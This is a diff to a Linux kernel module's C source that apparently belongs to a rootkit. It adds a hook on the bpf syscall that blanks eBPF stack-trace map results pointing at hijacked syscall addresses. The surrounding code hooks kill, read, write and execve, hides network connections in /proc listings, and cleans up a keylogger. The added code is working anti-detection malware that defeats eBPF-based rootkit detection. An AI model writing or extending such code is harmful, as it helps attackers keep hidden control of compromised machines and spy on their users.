@@ -12,10 +12,14 @@
 #include <linux/tcp.h>
 #include <linux/kprobes.h>
 #include <linux/module.h>
+#include <linux/bpf.h>
+#include <uapi/linux/bpf.h>
 #include <uapi/linux/binfmts.h>
+#include <linux/percpu.h>
 #include "lkm.h"
 #include "fs.h"
 #include "obfstr.h"
+#include "bpf.h"
 
 #pragma GCC optimize("-fno-optimize-sibling-calls")
 
@@ -27,6 +31,7 @@ sys64 real_m_kill;
 sys64 real_m_write;
 sys64 real_m_read;
 sys64 real_m_execve;
+sys64 real_m_bpf;
 
 #define PT_REGS_PARM1(x) ((x)->di)
 #define PT_REGS_PARM2(x) ((x)->si)
@@ -351,6 +356,149 @@ out:
     if (fs)
         kfree(fs);
     return real_m_write(regs);
+}
+
+/**
+ * Stolen static/private helpers
+ * from the kernel
+ */
+static inline void *u64_to_ptr(__u64 ptr) {
+    return (void *)(unsigned long)ptr;
+}
+
+static inline bool stack_map_use_build_id(struct bpf_map *map) {
+    return (map->map_flags & BPF_F_STACK_BUILD_ID);
+}
+
+static inline int stack_map_data_size(struct bpf_map *map) {
+    return stack_map_use_build_id(map) ?
+        sizeof(struct bpf_stack_build_id) : sizeof(u64);
+}
+
+static u32 bpf_map_value_size(struct bpf_map *map)
+{
+    if (map->map_type == BPF_MAP_TYPE_PERCPU_HASH ||
+            map->map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH ||
+            map->map_type == BPF_MAP_TYPE_PERCPU_ARRAY ||
+            map->map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE)
+        return round_up(map->value_size, 8) * num_possible_cpus();
+    else if (IS_FD_MAP(map))
+        return sizeof(u32);
+    else
+        return  map->value_size;
+}
+
+static unsigned long _get_sys_addr(unsigned long addr) {
+    struct sys_addr_list *sl, *sl_safe;
+    unsigned long a = addr & 0xfffffffffffffff0;
+    list_for_each_entry_safe(sl, sl_safe, &sys_addr, list) {
+        if(sl->addr == a) {
+            prinfo("bpf match: %lx -> %lx\n", sl->addr, a);
+            return sl->addr;
+        }
+    }
+    return 0UL;
+}
+
+static asmlinkage long m_bpf(struct pt_regs *regs) {
+
+    long ret = 0;
+    union bpf_attr *attr = NULL;
+    struct kernel_syscalls *ks;
+    union bpf_attr __user *uattr;
+    void *key = NULL, *value = NULL;
+    unsigned long size = (unsigned int)PT_REGS_PARM3(regs);
+
+    /** Call original straightaway */
+    ret = real_m_bpf(regs);
+
+    if (!(attr = (union bpf_attr *)kmalloc(size, GFP_KERNEL)))
+        goto out;
+
+    uattr = (union bpf_attr __user *)PT_REGS_PARM2(regs);
+    if (copy_from_user(attr, uattr, size))
+        goto out;
+
+    ks = kv_kall_load_addr();
+    if (ks && ks->k_bpf_map_get) {
+        struct bpf_map *map = ks->k_bpf_map_get(attr->map_fd);
+        struct bpf_stack_map *smap = container_of(map, struct bpf_stack_map, map);
+
+        if (!smap) {
+            prerr("smap error\n");
+            goto out;
+        }
+
+        /**
+         * In order to extract the value we must unwrap
+         * sys_bpf -> __sys_bpf -> map_lookup_elem
+         * In other words, recover the user ptr that is
+         * about to be returned to userspace, read, modify
+         * and write it back, hopefully, nullified if
+         * there is a match.
+         */
+        if (attr->map_type == BPF_MAP_TYPE_PERF_EVENT_ARRAY) {
+            u32 id;
+            void __user *ukey = u64_to_user_ptr(attr->key);
+            struct stack_map_bucket *bucket;
+            u32 trace_len, value_size;
+            unsigned long s;
+
+            key = kmalloc(map->key_size, GFP_KERNEL);
+            if (!key) goto out;
+
+            if (copy_from_user(key, ukey, map->key_size))
+                goto out;
+
+            id = *(u32*)key;
+            if (unlikely(id >= smap->n_buckets)) {
+                prerr("id error: id=%d key=%p\n", id, key);
+                goto out;
+            }
+
+            bucket = xchg(&smap->buckets[id], NULL);
+            if (!bucket) goto out;
+
+            value_size = bpf_map_value_size(map);
+            value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);
+            if (!value) goto out;
+
+            trace_len = bucket->nr * stack_map_data_size(map);
+            memcpy(value, bucket->data, trace_len);
+            memset(value + trace_len, 0, value_size - trace_len);
+
+            /**
+             * Now we check if value (stored syscall address)
+             * is among the ones we are hijacking
+             */
+            s = _get_sys_addr(*(unsigned long*)value);
+            if (s != 0UL) {
+                void *v = kmalloc(value_size, GFP_KERNEL);
+                if (v) {
+                    /**
+                     * Convert value to user ptr
+                     * and clear it
+                     */
+                    void __user *uvalue = u64_to_user_ptr(attr->value);
+                    memset(v, 0, value_size);
+
+                    /**
+                     * Send the new empty value back to the userspace.
+                     * Let's not alter the original return status, happens
+                     * that the stack is empty :)
+                     */
+                    if (copy_to_user((void*)uvalue, (void*)v, value_size))
+                        prerr("Failed to copy bpf uvalue\n");
+
+                    kv_mem_free(v);
+                }
+            }
+        }
+    }
+
+out:
+    kv_mem_free(key, value, attr);
+    return ret;
 }
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION( 3, 10, 0 )
@@ -858,7 +1006,7 @@ static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs
  */
 static unsigned long  _load_syscall_variant(struct kernel_syscalls *ks,
         const char *str) {
-    unsigned long rv;
+    unsigned long rv = 0UL;
     if (!ks || !ks->k_kallsyms_lookup_name) {
         prerr("unresolved: kallsyms_lookup_name\n");
         return 0L;
@@ -877,6 +1025,16 @@ static unsigned long  _load_syscall_variant(struct kernel_syscalls *ks,
 
         snprintf(tmp, 64, "__x64_%s", str);
         rv = ks->k_kallsyms_lookup_name(tmp);
+    }
+
+    if (rv) {
+        struct sys_addr_list *sl;
+        sl = kcalloc(1, sizeof(struct sys_addr_list) , GFP_KERNEL);
+        if(sl) {
+            sl->addr = rv;
+            prinfo("add sysaddr: %lx\n", sl->addr);
+            list_add_tail(&sl->list, &sys_addr);
+        }
     }
 
     return rv;
@@ -945,6 +1103,10 @@ struct kernel_syscalls *kv_kall_load_addr(void) {
         if (!ks.k_attach_pid)
             prwarn("invalid data: attach_pid will not work\n");
 
+        ks.k_bpf_map_get = (bpf_map_get_sg)ks.k_kallsyms_lookup_name("bpf_map_get");
+        if (!ks.k_bpf_map_get)
+            prwarn("invalid data: bpf_map_get will not work\n");
+
         ks.k_sys_setreuid   = (sys64)_load_syscall_variant(&ks, "sys_setreuid");;
         if (!ks.k_sys_setreuid)
             prwarn("invalid data: syscall hook setreuid will not work\n");
@@ -958,6 +1120,7 @@ static struct ftrace_hook ft_hooks[] = {
     {"sys_kill", m_kill, &real_m_kill, true},
     {"sys_write", m_write, &real_m_write, true},
     {"sys_read", m_read, &real_m_read, true},
+    {"sys_bpf", m_bpf, &real_m_bpf, true},
     {"tcp4_seq_show", m_tcp4_seq_show, &real_m_tcp4_seq_show},
     {"udp4_seq_show", m_udp4_seq_show, &real_m_udp4_seq_show},
     {"tcp6_seq_show", m_tcp6_seq_show, &real_m_tcp6_seq_show},
@@ -1115,7 +1278,14 @@ bool sys_init(void) {
 }
 
 void sys_deinit(void) {
+    struct sys_addr_list *sl, *sl_safe;
     fh_remove_hooks(ft_hooks);
     _keylog_cleanup();
     _md5log_cleanup();
+
+    list_for_each_entry_safe(sl, sl_safe, &sys_addr, list) {
+        list_del(&sl->list);
+        kfree(sl);
+        sl = NULL;
+    }
 }
